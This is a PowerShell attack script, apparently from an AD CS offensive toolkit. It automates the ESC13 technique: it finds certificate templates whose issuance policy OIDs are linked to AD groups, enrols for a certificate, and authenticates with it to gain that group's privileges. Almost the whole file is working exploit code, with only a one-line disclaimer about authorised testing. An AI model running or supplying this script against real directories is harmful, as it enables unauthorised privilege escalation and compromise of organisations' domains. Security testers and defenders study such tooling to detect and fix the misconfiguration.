<#
.SYNOPSIS
    AD CS ESC13 - OID Group Link Abuse (LOLBAS).
.DESCRIPTION
    Exploits certificate templates with issuance policy OIDs linked to AD groups
    via msDS-OIDToGroupLink. Enrolling in the template grants effective
    membership in the linked group when authenticating with the certificate.
.PARAMETER CAConfig
    CA configuration string (e.g., "polaris.zsec.red\corp-DC01-CA")
.PARAMETER TemplateName
    Template with issuance policy OID linked to a group
.EXAMPLE
    .\Invoke-ESC13.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "PolicyLinkedTemplate"
.NOTES
    For authorised security testing and educational purposes only.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory)] [string]$CAConfig,
    [Parameter(Mandatory)] [string]$TemplateName,

    [string]$PFXPassword,
    [string]$OutputDir = "$env:TEMP\adcs-ops",
    [ValidateSet('Schannel','PKINIT','Both')] [string]$AuthMethod = 'Both',
    [string]$DCTarget,
    [switch]$SkipAuth
)

$ErrorActionPreference = 'Stop'
if (-not $PFXPassword) { $PFXPassword = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 20 | ForEach-Object { [char]$_ }) }
if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$_dir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }
. "$_dir\adcs-common.ps1"

Write-Host ""
Write-Host "  AD CS LOLBAS - ESC13 Standalone" -ForegroundColor White
Write-Host "  ---------------------------------" -ForegroundColor DarkGray
Write-Host ""

Write-Banner "ESC13" "OID Group Link Abuse"

$ctx = Get-ADContext

Write-Stage -Number 1 -Name "RECONNAISSANCE"
$tpl = Get-ADObject -SearchBase $ctx.TemplateBase -Filter {cn -eq $TemplateName} `
    -Properties 'msPKI-Certificate-Policy' -ErrorAction SilentlyContinue

if (-not $tpl) {
    Write-Host "    [-] Template '$TemplateName' not found" -ForegroundColor Red
    Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'FAILED'; exit 1
}

$certPolicy = $tpl.'msPKI-Certificate-Policy'
if (-not $certPolicy) {
    Write-Host "    [-] Template has no issuance policy" -ForegroundColor Red
    Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'FAILED'; exit 1
}

$linkedGroup = $null
foreach ($oid in $certPolicy) {
    $oidObj = Get-ADObject -SearchBase $ctx.OIDBase `
        -Filter {msPKI-Cert-Template-OID -eq $oid} `
        -Properties 'msDS-OIDToGroupLink','displayName' -ErrorAction SilentlyContinue
    if ($oidObj.'msDS-OIDToGroupLink') {
        $linkedGroup = Get-ADGroup -Identity $oidObj.'msDS-OIDToGroupLink' -Properties Description
        Write-Host "    [!] OID $oid -> Group: $($linkedGroup.Name)" -ForegroundColor Yellow
        Write-Host "    [i] DN: $($linkedGroup.DistinguishedName)" -ForegroundColor Gray
    }
}

if (-not $linkedGroup) {
    Write-Host "    [-] No OID group links found" -ForegroundColor Red
    Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'FAILED'; exit 1
}
Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'COMPLETE'

Write-Stage -Number 2 -Name "POSITIONING" -Status 'SKIPPED'

# STAGE 3: ENROLL
Write-Host ""
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST"
$inf = New-CertRequestINF -Subject "CN=$env:USERNAME" -Template $TemplateName `
    -OutFile "$OutputDir\esc13.inf" -Exportable
$result = Invoke-CertRequest -INFFile $inf -CA $CAConfig -Prefix "esc13"
if (-not $result.Success) { Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'FAILED'; exit 1 }
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'COMPLETE'

Write-Host ""
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION"
Write-Host "    [+] Certificate contains issuance policy OID" -ForegroundColor Green
Write-Host "    [i] Authenticating with this cert grants effective membership in: $($linkedGroup.Name)" -ForegroundColor Cyan
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION" -Status 'COMPLETE'

Invoke-AuthStage -PFXFile $result.PFXFile -PFXPass $PFXPassword -DC $DCTarget

Write-Host ""
Write-Host "  Complete. Artifacts in: $OutputDir" -ForegroundColor Gray
Write-Host ""
